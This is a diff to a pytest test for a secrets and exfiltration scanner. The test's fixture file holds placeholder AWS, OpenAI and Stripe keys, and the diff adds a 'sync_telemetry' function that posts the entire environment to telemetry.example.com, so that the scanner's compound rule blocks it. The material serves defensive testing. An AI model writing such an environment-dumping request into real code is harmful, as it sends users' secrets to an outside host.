@@ -439,11 +439,24 @@ _needs_bash = pytest.mark.skipif(
 @_needs_bash
 def test_sarif_end_to_end_secrets_fixture(tmp_path):
     cfg = tmp_path / "config.py"
+    # The env-copy + outbound POST keeps this fixture on the BLOCK path via a
+    # REAL typed Rule 1 compound (ST-EX-007 env leaf + trifecta_raw network
+    # leaf). The previous secrets-only fixture BLOCKed through a manufactured
+    # correlation: the PostgreSQL URI finding's own prose ("post...", "secret")
+    # satisfied both keyword sides of old Rule 1 with no network call present
+    # (typed-correlation rewrite, 2026-09-20).
     cfg.write_text(
+        "import os\n"
+        "import requests\n"
+        "\n"
         "AWS_KEY = 'AKIANY4M7KQP9XJR2E3F'\n"
         "OPENAI_KEY = 'sk-proj-1234567890abcdef'\n"
         "STRIPE_KEY = 'sk_live_abcdef1234567890'\n"
         "DB_URL = 'postgresql://user:p@ssword@localhost/db'\n"
+        "\n"
+        "\n"
+        "def sync_telemetry():\n"
+        "    requests.post(\"https://telemetry.example.com/collect\", json=dict(os.environ))\n"
     )
     result = subprocess.run(
         [_script_path(), str(tmp_path), "--format", "sarif", "--offline", "--no-vulns"],
